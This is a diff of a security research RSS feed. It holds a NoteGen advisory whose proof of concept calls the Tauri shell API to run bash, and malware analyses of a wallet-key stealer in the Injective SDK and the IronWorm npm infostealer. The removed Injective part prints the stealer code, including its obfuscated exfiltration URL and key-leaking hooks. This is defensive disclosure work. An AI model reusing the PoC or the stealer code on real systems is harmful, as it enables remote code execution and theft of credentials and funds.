@@ -4,13 +4,13 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Sat, 01 Aug 2026 00:43:33 GMT</lastBuildDate>
+        <lastBuildDate>Sat, 01 Aug 2026 06:23:12 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
         <atom:link href="https://research.jfrog.com/rss.xml" rel="self" type="application/rss+xml"/>
         <item>
-            <title><![CDATA[SQLite Critical CVEs or LLM Slopes]]></title>
+            <title><![CDATA[SQLite Critical CVEs or LLM Slop?]]></title>
             <link>https://research.jfrog.com/post/sqlite-critical-cves-or-llm-slops/</link>
             <guid>https://research.jfrog.com/post/sqlite-critical-cves-or-llm-slops/</guid>
             <pubDate>Thu, 30 Jul 2026 00:00:00 GMT</pubDate>
@@ -18,9 +18,7 @@
             <content:encoded><![CDATA[
 ![](/img/RealTimePostImage/post/sqlite-critical-cves-or-llm-slops/image1.png)
 
-# SQLite Critical CVEs or LLM Slopes
-
-Over the past few days, a newly created GitHub repo ([**programmervuln/cveadvisory-**](https://github.com/programmervuln/cveadvisory-)) published a batch of SQLite vulnerability advisories (as part of other 50+ CVEs which we believe are also LLM slopes except from one). NVD quickly flagged these as critical, and CISA's ADP agreed. But when JFrog security researchers dug in to verify, the claims fell apart:
+Over the past few days, a newly created GitHub repo ([**programmervuln/cveadvisory-**](https://github.com/programmervuln/cveadvisory-)) published a batch of SQLite vulnerability advisories (as part of other 50+ CVEs which we believe are also LLM slop except from one). NVD quickly flagged these as critical, and CISA's ADP agreed. But when JFrog security researchers dug in to verify, the claims fell apart:
 
 1. The cited code didn't even exist in those versions or referenced unrelated logic.   
 2. When testing the PoC payloads they didn’t work (not triggering any crash).  
@@ -31,7 +29,7 @@ Over the past few days, a newly created GitHub repo ([**programmervuln/cveadviso
 
 *Combining all advisories into one file triggers AI-generated content warnings*
 
-This made us question the reliability of these CVEs as well as understanding that these CVEs may be LLM slops.
+This made us question the reliability of these CVEs as well as understanding that these CVEs may be LLM slop.
 
 While investigating one of the CVEs yesterday, CVE-2026-51302, we saw that Red Hat initially assigned it a 10.0 Critical severity score:
 
@@ -248,74 +246,6 @@ https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
-            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
-
-
-## Component
-
-note-gen (NoteGen)
-
-## Affected versions
-
-< 0.32.0
-
-## Description
-
-NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
-
-## PoC
-
-<br>
-
-**Step 1 - Obtain JavaScript execution in the NoteGen webview**
-
-<br>
-
-Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
-
-<br>
-
-**Step 2 - Invoke the Tauri shell execute API**
-
-<br>
-
-From the webview, call:
-
-```javascript
-window.__TAURI__.core.invoke('plugin:shell|execute', {
-  program: 'bash',
-  args: ['-c', 'open -a Calculator'],
-  options: { cwd: null, env: null, encoding: 'utf-8' }
-});
-```
-
-<br>
-
-**Step 3 - Verify OS command execution**
-
-<br>
-
-Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
-
-## Vulnerability Mitigations
-
-Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
-
-## References
-https://github.com/advisories/GHSA-r5ff-hq22-rhgv
-https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
-https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
             <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
             <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
@@ -393,6 +323,74 @@ Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTM
 ## References
 https://github.com/advisories/GHSA-gwhc-vprp-gfcg
 https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
 https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
@@ -1076,243 +1074,232 @@ The Lucide Proxy campaign illustrates the risks of using third-party unblocking 
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Injective SDK Compromise: Crypto Wallet Keys Stolen Through Fake Telemetry]]></title>
-            <link>https://research.jfrog.com/post/injective-sdk-supply-chain-attack/</link>
-            <guid>https://research.jfrog.com/post/injective-sdk-supply-chain-attack/</guid>
+            <title><![CDATA[IronWorm Returns as jscrambler, Rustier Than Ever]]></title>
+            <link>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</link>
+            <guid>https://research.jfrog.com/post/ironworm-returns-rustier-than-ever/</guid>
             <pubDate>Sun, 12 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[Attackers compromised the official Injective TypeScript SDK release line and shipped a runtime wallet-key stealer disguised as key-derivation telemetry.]]></description>
+            <description><![CDATA[Only a month after we exposed the IronWorm infostealer, an evolved variant has surfaced in compromised versions of the popular jscrambler npm package. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.]]></description>
             <content:encoded><![CDATA[
-The JFrog Security Research team analyzed the compromised `@injectivelabs/sdk-ts` npm package version `1.20.21`, an official Injective Labs TypeScript SDK release that briefly shipped a wallet-key stealer. `@injectivelabs/sdk-ts` is used by JavaScript and TypeScript applications that interact with the Injective blockchain, including applications that create wallets, load private keys, and sign transactions.
-In our review, we found that the payload can run in more places than it first appears. Byte-key wallet wrappers can still **leak full private keys** after converting them to hex strings, and the compiled package keeps source-region comments that make static detection easier even though the original TypeScript source is not shipped. This also fits a broader shift we expect after npm v12, where install scripts are no longer enabled by default and attackers have more reason to move malicious logic into runtime code paths, as discussed in our [npm v12 analysis](https://jfrog.com/blog/npm-v12-from-implicit-to-explicit-trust/).
+Only a month after we exposed the [IronWorm infostealer](https://research.jfrog.com/post/iron-worm-shai-hulud-rustier-cousin/), an evolved variant has surfaced in compromised versions of the popular `jscrambler` npm package, resembling similar behavior to Shai-Hulud; like the original version of IronWorm did. The malware has shed its Linux-only skin, deploying a three-platform CSI container to target macOS and Windows, expanding its persistence, and automating its own propagation via direct registry PUT operations.
 
-![](/img/RealTimePostImage/post/injective-sdk-supply-chain-attack.png)
+<div align="center">
 
-## Affected Packages
+![](/img/RealTimePostImage/post/ironworm/returns.png)
 
-Only `@injectivelabs/sdk-ts@1.20.21` contains the malicious payload we analyzed. The other `@injectivelabs` packages in the same release wave do not appear to contain a copy of the stealer code themselves. They are affected because they were published at `1.20.21` with dependency relationships that pulled in the compromised SDK version. The full affected-package list appears in the IOCs section.
+</div>
 
-The fixed release is `1.20.23`.
+The attack surfaced via the `jscrambler` package on npm, uploaded on July 11, 2026. Versions 8.14.0, 8.16.0, 8.17.0, 8.18.0, and 8.20.0 all contain `package/dist/intro.js`, which is the bundle that contains the malicious native payload loader.
 
-## Not An Install-Time Attack
+The implant is an evolved variant of IronWorm, preserving its unusual architecture while significantly expanding platform coverage, persistence mechanisms, and target lists. Here is the breakdown of what has changed and why this new variant shows the attackers are becoming much more sophisticated.
 
-Many npm attacks run during package installation. This one did not. The package scripts look normal. The malicious code runs only when the SDK is used. With npm v12 reducing implicit trust in lifecycle scripts, runtime-triggered payloads like this become a more likely direction for attackers.
+## Shift in packaging: The custom CSI container
 
-The payload was added to the compiled account bundle:
+The first campaign we analyzed used a Linux x86-64 executable packed with a lightly modified UPX stub. The new variant abandons UPX entirely for cross-platform delivery. Instead, the malicious script in `dist/intro.js` parses a custom container format starting with the magic bytes `1B 43 53 49 01 03 00` (CSI).
 
-```js
-//#region src/utils/key-derivation-telemetry.ts
-/**
-* Key derivation telemetry — collects anonymized usage metrics for SDK optimization.
-*
-* Tracks which key derivation methods are used (hex vs mnemonic) and derives
-* timing patterns to help the SDK team identify performance bottlenecks and
-* understand adoption of different key formats across the ecosystem.
-*/
+This container holds three distinct native payloads:
+* A Linux x86-64 PIE ELF executable
+* A Windows x86-64 PE32+ executable
+* A macOS arm64 Mach-O executable
+
+When the installer runs, the JavaScript loader checks the host operating system using `process.platform`. It selects the corresponding slice of the CSI container, decompresses it via gzip, writes the binary to a hidden temporary path, and executes it as a detached background process.
+
+<div align="center">
+
+![CSI loader JavaScript](/img/RealTimePostImage/post/ironworm/decomp-1.png)
+
+</div>
+
+## Automated npm self-propagation
+
+While the previous variant contained logic for credential theft and potential commit forging, our analysis of the new Linux payload confirms an end-to-end, fully automated npm propagation routine.
+
+Unlike the first variant, which attempted to exchange OIDC identity tokens for Trusted Publishing, this variant goes back to basics but automates it completely. It performs the following steps without needing any local npm command line tools:
+
+1. **Collects npm credentials:** It scans environment variables and files on disk for `NPM_TOKEN`, `NODE_AUTH_TOKEN`, `NPM_CONFIG__AUTHTOKEN`, `NPM_CONFIG_TOKEN`, `NPM_AUTH_TOKEN`, `.npmrc`, `/etc/npmrc`, and `_authToken=`.
+2. **Validates credentials:** It queries `registry.npmjs.org/-/whoami` to verify the token, then lists organizations and packages using `/-/orgs` and `/-/v1/user/<user>/packages`.
+3. **Selects popular targets:** It queries `api.npmjs.org/downloads/point/last-month` to prioritize packages with higher download counts.
+4. **Downloads and infects:** It retrieves the latest `.tgz` archive of the target package, unpacks it, adds a malicious `setup.mjs` script, and rewrites `package.json` to trigger `node setup.mjs` via `scripts.preinstall`.
+5. **Direct registry publication:** Instead of executing `npm publish`, the native payload builds the necessary publication metadata JSON and uploads it directly to `registry.npmjs.org` using a raw HTTP `PUT` request on port 443 with the stolen bearer token.
+
+<div align="center">
+
+![npm registry PUT decompilation](/img/RealTimePostImage/post/ironworm/decomp-2.png)
+
+</div>
+
+## Expanded target set: VPNs, offensive tools, and password managers
+
+The original campaign swept for developer environment keys, cloud credentials, and cryptocurrency wallets (specifically Exodus). The new variant has heavily expanded its targets.
+
+### Active browser-extension wallet theft
+Instead of relying solely on modifying the local desktop Exodus application, the malware uses its unique per-site string encryption to target browser extensions. The encryption routine uses ChaCha20-Poly1305 with a distinct 32-byte key and 12-byte nonce for every single string call site. Decrypting these strings reveals targets such as MetaMask (`nkbihfbeogaeaoehlefnkodbefgpgknn`) and Trust Wallet (`egjidjbpglichdcondbcbdnbeeppgdph`).
+
+<div align="center">
+
+![Wallet target decryption](/img/RealTimePostImage/post/ironworm/decomp-3.png)
+
+</div>
+
+### VPN and network credentials
+The malware now searches for and exfiltrates WireGuard configuration files (`/etc/wireguard/*.conf`), OpenVPN configurations (`/etc/openvpn`), IPsec secrets (`/etc/ipsec.secrets`), strongSwan configurations, and PPP CHAP/PAP credentials.
+
+### Evolved Tor command and control (C2)
+While the previous variant utilized simple HTTP-based Tor communication, our analysis of the new Linux payload reveals a significantly more sophisticated Tor transport and exfiltration mechanism.
+
+#### Local Tor Expert Bundle management
+When launched, the malware dynamically acquires and manages its own Tor network path rather than relying on a pre-installed client:
+1. It probes localhost to find an open SOCKS port.
+2. If none is available, it connects directly to `archive.torproject.org:443` to download the official Tor Expert Bundle archive (`tor-expert-bundle-<platform>-16.0a7.tar.gz`), extracting the binary and its dependent libraries (`libcrypto.so.3`, `libssl.so.3`, and `libevent`).
+3. It generates a local `.torrc` configuration setting `RunAsDaemon 0`. It launches Tor as a foreground child process, monitoring its standard error until it reads the `Bootstrapped 100%` success signal.
+
+#### Direct SOCKS5 CONNECT negotiation
+To route traffic, the native payload negotiates SOCKS5 handshake requests directly at the socket level. It connects to the local Tor SOCKS proxy and performs authentication negotiation (`05 01 00` requiring a `05 00` no-authentication response) followed by a domain CONNECT request. This instructs Tor to perform the destination DNS resolution directly, concealing the lookup from the host system.
+
+#### Multi-route C2 transport
+The malware supports two distinct Tor-carried communication routes:
+* **HTTP Bootstrap (Route 1):** SOCKS connects to the destination C2 hostname on port 80, followed by a `POST / HTTP/1.0` request containing the 32-byte client public key. Unlike the original IronWorm's `/api/agent` path, this HTTP wrapper has been simplified to use the root `/` path.
+* **Raw Stream (Route 2):** Alternatively, the malware negotiates SOCKS to the destination on port 8080, bypassing HTTP headers entirely to communicate over a raw, structured TCP channel.
+
+#### Layered stream cryptography (X25519 & ChaCha20-Poly1305)
+The communication channel uses layered, application-level encryption inside the Tor stream:
+
+1. **X25519 Public Key Exchange:** The client generates 32 random bytes, clamps them as an X25519 private scalar, and derives its public key. It sends this public key during the bootstrap phase. It decrypts an embedded server public key (`x25519_server_pub`) stored securely in its configuration, so no server public key needs to be exchanged over the wire.
+2. **Directional HKDF Expansion:** The resulting shared secret is expanded into separate client-to-server (`csi-a2s`, `hkdf a2s`) and server-to-client (`csi-s2a`, `hkdf s2a`) key spaces, preventing key reuse.
+3. **ChaCha20-Poly1305 Framing:** Every message is framed with a 4-byte big-endian length, a 12-byte nonce, and a ChaCha20-Poly1305 authenticated ciphertext payload.
+
+Once the encrypted handshaking loop completes, the malware sends an encrypted `hello` JSON payload detailing CPU cores, system locale, active users, and environment info, then enters a loop supporting remote liveness pings, command execution (via `bash`, `python3`, powershell, and `cmd`), and remote command cancellation.
+
+<div align="center">
+
+![SOCKS5 CONNECT and key exchange](/img/RealTimePostImage/post/ironworm/decomp-4.png)
+
+</div>
+
+#### The dual-path exfiltration blunder
+The malware's exfiltration strategy uses a dual-path architecture that is as clever as it is self-defeating. 
+
+For control, commands, and metadata, the implant sticks to the encrypted Tor SOCKS5 channel. The initial system fingerprint, sent as an encrypted `t=hello` packet, contains everything from the hardware ID and active user to the CPU core count, system locale, and local SOCKS port.
+
+But when it comes to bulk exfiltration, the malware authors made a massive opsec blunder. 
+
+Instead of routing large file uploads, source trees, or harvested credential databases through the slow Tor network, the malware bypasses the proxy entirely. It uses the `rustls` library to open a direct, unproxied HTTPS connection to `temp.sh`, a public file-sharing service. It uploads the stolen data using a standard multipart/form-data `POST` request. Once the upload finishes, the malware parses the response for the resulting `https://` URL and transmits that link back to the operator over the Tor C2 stream.
+
+This design has two major implications:
+* **Real IP exposure:** The query to `check.torproject.org/api/ip` to obtain the victim's public IP (which is included in the encrypted `hello` packet) is made directly over TLS, leaking the victim's real, unproxied IP address to the Tor Project's infrastructure before C2 communication even starts.
+* **Network visibility:** Any network monitor or firewall will see the bulk data transfer going straight to a public file host over direct TLS, completely defeating the anonymity of using Tor for the command channel.
+
+Staging stolen data on a public file host also means the operator does not have to host or scale their own storage infrastructure. However, it also means the victim's sensitive secrets are left on a third-party service where they might be exposed if the generated URLs are guessed or the host's logs are audited.
+
+### Tor hidden-service keys
+Separately from launching its own Tor client for C2 communication, the malware now scans the host for Tor configuration files and actively steals private keys associated with third-party onion services. This includes files such as `hs_ed25519_secret_key`, `hs_ed25519_public_key`, and `private_key_ed25519`.
+
+### Offensive-security infrastructure
+In a highly targeted move, the implant searches for local installations and configuration folders of popular red-team and C2 frameworks, including Metasploit, Sliver, Havoc, Mythic, Covenant, AdaptixC2, and Shad0w. This suggests the threat actors are intentionally targeting the workstations of security researchers, penetration testers, and operators.
+
+### Password managers and local key-stores
+The credential scanner now collects local vaults for 1Password and Bitwarden. On Linux systems, it actively queries the KDE Wallet service over D-Bus (`org.kde.KWallet`) and executes `kwallet-query --read-password` to extract passwords directly from the system keyring.
+
+## Broad cross-platform persistence
+
+The previous variant only used basic systemd user services to maintain persistence on Linux systems. The new codebase contains a dedicated, cross-platform persistence engine that deploys different mechanisms depending on the host:
+
+* **Linux:** It attempts to install a systemd system service under `/etc/systemd/system` with `Restart=always`, reloading the daemon and starting it immediately. If that fails, it falls back to a user-level systemd unit under `~/.config/systemd/user` or traditional cron jobs (`/etc/cron.d` or user crontab).
+* **macOS:** It deploys LaunchAgents and LaunchDaemons plist files to ensure execution across user sessions and system boots.
+* **Windows:** It writes its payload directly into the user's Startup folder (`AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup`).
+
+## Remediation guidance
+
+If your environment has installed any of the compromised `jscrambler` versions, you must assume your system is compromised and all local credentials are compromised.
+
+### Step 1: Containment
+Cut off the malware's ability to propagate or exfiltrate:
+* **Revoke and rotate ALL secrets and credentials** that were present on the infected host. This includes AWS, Kubernetes, Docker, database, and SSH keys.
+* **Revoke all npm tokens** immediately. Check your npm account's publishing history for unauthorized package versions.
+* Block outgoing connections to the observed C2 IP addresses (`37.27.122.124` and `57.128.246.79`) and Tor onion-routing nodes.
+
+### Step 2: Eradication of persistence
+Depending on your platform, locate and remove the persistence hooks.
+
+On Linux:
+```shell
+# Check and stop systemd services
+systemctl stop malicious-service-name.service
+systemctl disable malicious-service-name.service
+rm -f /etc/systemd/system/malicious-service-name.service
+systemctl daemon-reload
+
+# Check user-level systemd services
+systemctl --user stop pgmon.service
+systemctl --user disable pgmon.service
+rm -f ~/.config/systemd/user/pgmon.service
+systemctl --user daemon-reload
+
+# Check cron jobs
+crontab -r
+rm -f /etc/cron.d/malicious-job
 ```
 
-The comment is written to sound like normal product analytics. Underneath it, the implementation records the actual secret material.
+On macOS:
+Identify and delete any unrecognized plist files under:
+* `~/Library/LaunchAgents/`
+* `/Library/LaunchAgents/`
+* `/Library/LaunchDaemons/`
 
-## Where The Payload Runs
+On Windows:
+Check the startup folder and delete any unrecognized executable or shortcut:
+* `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
 
-The payload is triggered when code calls `PrivateKey.fromMnemonic()` or `PrivateKey.fromHex()`. These functions are used when an application loads a wallet from a mnemonic phrase or from a raw private key.
+### Step 3: Package cleanup and dependency locking
+Purge the compromised `jscrambler` versions from your projects:
+```shell
+# Remove node_modules and clean npm cache
+rm -rf node_modules
+npm cache clean --force
 
-The malicious addition is the call to `trackKeyDerivation()`, which receives the mnemonic or private key before the SDK continues with normal key creation.
-
-```js
-static fromMnemonic(words, path = DEFAULT_DERIVATION_PATH) {
-  trackKeyDerivation("fm", words);
-  return new PrivateKey(new Wallet(HDNodeWallet.fromPhrase(words, void 0, path).privateKey));
-}
-
-static fromHex(privateKey) {
-  trackKeyDerivation("fh", typeof privateKey === "string" ? privateKey : "bytes");
-  const isString = typeof privateKey === "string";
-  const privateKeyHex = isString && privateKey.startsWith("0x") ? privateKey.slice(2) : privateKey;
-  return new PrivateKey(new Wallet(uint8ArrayToHex(isString ? hexToUint8Array(privateKeyHex.toString()) : privateKey)));
-}
+# Force downgrade or update to a clean version (8.21.0 or newer)
+# Avoid the infected range: 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0
+npm install jscrambler@latest
 ```
 
-`PrivateKey.generate()` is affected as well, even though it is not patched directly. It creates a mnemonic and immediately calls `PrivateKey.fromMnemonic(mnemonic)`, so a freshly generated wallet can be queued for exfiltration before the caller receives the returned key object.
+## Known malicious packages
 
-One small but useful exception: the deprecated `PrivateKey.fromPrivateKey()` method constructs an `ethers.Wallet` directly and does not call `trackKeyDerivation()`. The attacker did not patch every constructor. They patched the modern paths most developers are likely to use.
+Through our continuous monitoring and threat intelligence pipeline, we have identified the following compromised package versions containing the IronWorm Rust implant:
 
-## SDK Calls That Import The Infected PrivateKey
-
-The payload is only in the `PrivateKey` class inside the infected `accounts-jQ1GSgaW.js` bundle. We found other built SDK files that import this same `PrivateKey` class and then call its infected `fromHex()` method.
-
-The transaction broadcaster imports `PrivateKey` from the infected accounts bundle:
-
-```js
-import { S as createSignDoc, T as createSigners, b as createFee, n as PrivateKey, t as BaseAccount, v as createAuthInfo, y as createBody } from "./accounts-jQ1GSgaW.js";
-```
-
-Later, `MsgBroadcasterWithPk` calls `PrivateKey.fromHex()` when `options.privateKey` is not already a `PrivateKey` object:
-
-```js
-this.privateKey = options.privateKey instanceof PrivateKey
-  ? options.privateKey
-  : PrivateKey.fromHex(options.privateKey);
-```
-
-So a Node application using `MsgBroadcasterWithPk` with a raw private key can reach the infected method while creating the broadcaster.
-
-The CosmJS-compatible wallet wrapper file also imports `PrivateKey` from the same infected bundle:
-
-```js
-import { F as PublicKey, k as getPublicKey, n as PrivateKey } from "./accounts-jQ1GSgaW.js";
-```
-
-In that file, both `EthSecp256k1Wallet` and `DirectEthSecp256k1Wallet` convert a byte array private key to hex and call `PrivateKey.fromHex()`:
-
-```js
-static async fromKey(privKey, prefix = "inj") {
-  return new EthSecp256k1Wallet(
-    privKey,
-    PrivateKey.fromHex(uint8ArrayToHex(privKey)).toPublicKey().toPubKeyBytes(),
-    prefix
-  );
-}
-
-constructor(privKey, pubKey, prefix) {
-  this.privateKey = PrivateKey.fromHex(uint8ArrayToHex(privKey));
-  this.publicKey = PublicKey.fromBytes(pubKey);
-  this.prefix = prefix;
-}
-```
-
-The same pattern appears again in `DirectEthSecp256k1Wallet`.
-
-In these wrapper calls, the byte array is converted to a hex string before reaching `fromHex()`, so the full private key is passed to the infected method.
-
-## Exfiltration Through A gRPC-Web Disguise
-
-The URL is hidden as character codes and rebuilt when the code runs:
-
-```js
-const _e = [
-  116, 101, 115, 116, 110, 101, 116, 46, 97, 114, 99, 104, 105, 118, 97, 108,
-  46, 99, 104, 97, 105, 110, 46, 103, 114, 112, 99, 45, 119, 101, 98, 46,
-  105, 110, 106, 101, 99, 116, 105, 118, 101, 46, 110, 101, 116, 119, 111,
-  114, 107
-];
-const _d = () => _e.map((x) => String.fromCharCode(x)).join("");
-const _ep = "https://" + _d() + "/";
-```
-
-The rebuilt endpoint is:
-
-```text
-hxxps://testnet[.]archival[.]chain[.]grpc-web[.]injective[.]network/
-```
-
-The stealer waits two seconds, groups the stolen values together, encodes them with base64, and sends them in an HTTP header:
-
-```js
-function trackKeyDerivation(method, value) {
-  _q.push(`${method}:${value}:${Date.now()}`);
-  _flush();
-}
-
-function _flush() {
-  if (_t) return;
-  _t = setTimeout(() => {
-    _t = null;
-    if (!_q.length) return;
-    _send(_enc(_q.join("|")));
-    _q = [];
-  }, 2e3);
-}
-```
-
-The request body is empty. The secret is carried in `X-Request-Id`, while the content type mimics the SDK's normal gRPC-Web traffic:
-
-```js
-fetch(_ep, {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/grpc-web+proto",
-    "X-Request-Id": d
-  },
-  ...typeof window !== "undefined" ? { keepalive: true } : {}
-}).catch(() => {});
-```
-
-
-## The Header Choice
-
-Putting the secret in `X-Request-Id` makes it easier to miss than putting it in the request body. Request IDs are often saved by proxies, API gateways, CDNs, and application logs for troubleshooting. If an affected environment logged the malicious request, the base64-encoded mnemonic or private key may have been copied into internal logs as well.
-
-A decoded header follows this structure:
-
-```text
-fm:<mnemonic words>:<timestamp>|fh:<hex private key>:<timestamp>
-```
-
-
-## Remediation
-
-Any project that installed `@injectivelabs/sdk-ts@1.20.21`, or any `@injectivelabs/*@1.20.21` package that depended on it, should treat wallet secrets handled by that runtime as compromised.
-
-Recommended actions:
-
-1. Upgrade all affected `@injectivelabs` packages to `1.20.23` or later.
-2. Check lockfiles and package-manager caches for `@injectivelabs/sdk-ts` version `1.20.21`.
-3. Rotate any mnemonic or private key passed to the affected SDK version.
-4. Move funds from wallets whose mnemonic or private key may have been loaded or generated by the compromised version.
-5. Search egress and proxy logs for `testnet.archival.chain.grpc-web.injective.network`.
-6. Search logs for base64-looking `X-Request-Id` values on `application/grpc-web+proto` POST requests.
-
-
-JFrog Curation customers using an immaturity policy were fully protected from this attack, as all of the hijacked packages were flagged in less than 24 hours. Curation has an automatic compliance version selection (CVS) mechanism to ensure developer and CI/CD seamless fallback to compliant, non-malicious versions.
-
+| Package Name | Malicious Versions | Xray ID |
+| :---- | :---- | :---- |
+| `jscrambler` | 8.14.0, 8.16.0, 8.17.0, 8.18.0, 8.20.0 | XRAY-1025905 |
 
 ## Conclusions
 
-This attack shows that supply-chain malware does not need to be noisy to be dangerous. There is no install-time execution here, no persistence mechanism, and no broad host reconnaissance. The attacker placed a small hook in wallet key-loading code and waited for applications to hand it wallet secrets.
+The evolution of IronWorm into a highly automated, cross-platform threat shows how rapidly modern software supply chain actors are maturing. Transitioning from a single Linux target with standard UPX to a custom three-platform CSI container demonstrates both capability and intent to strike developers regardless of their local operating system.
 
-The imported `PrivateKey` paths are worth paying attention to. Applications did not need to call `PrivateKey.fromMnemonic()` or `PrivateKey.fromHex()` explicitly to be exposed. Transaction broadcasting and CosmJS wallet wrapper flows also route through the compromised constructor, and byte-array private keys can be leaked once the SDK converts them to hex strings internally.
+The automation of the npm propagation pipeline (by writing infected tarballs and uploading them using direct raw HTTP PUT requests) bypasses standard local CLI guardrails and accelerates the infection cycle. Security teams must monitor not just package configuration files, but active network activity originating from local install scripts and build machines.
 
-## IOCs
+JFrog Curation customers are protected, as the malicious package versions have been blocked. We will continue monitoring the campaign and updating our intelligence feeds as new variants emerge.
 
-### Package IOCs
+## Indicators of Compromise (IOCs)
 
-| Package | Affected version | Xray IDs |
-| :--- | :--- | :--- |
-| `@injectivelabs/sdk-ts` | `1.20.21` | XRAY-1024734 |
-| `@injectivelabs/utils` | `1.20.21` | XRAY-1024741 |
-| `@injectivelabs/networks` | `1.20.21` | XRAY-1024740 |
-| `@injectivelabs/ts-types` | `1.20.21` | XRAY-1024736 |
-| `@injectivelabs/exceptions` | `1.20.21` | XRAY-1024733 |
-| `@injectivelabs/wallet-base` | `1.20.21` | XRAY-1024751 |
-| `@injectivelabs/wallet-core` | `1.20.21` | XRAY-1024748 |
-| `@injectivelabs/wallet-cosmos` | `1.20.21` | XRAY-1024735 |
-| `@injectivelabs/wallet-private-key` | `1.20.21` | XRAY-1024745 |
-| `@injectivelabs/wallet-evm` | `1.20.21` | XRAY-1024749 |
-| `@injectivelabs/wallet-trezor` | `1.20.21` | XRAY-1024737 |
-| `@injectivelabs/wallet-cosmostation` | `1.20.21` | XRAY-1024747 |
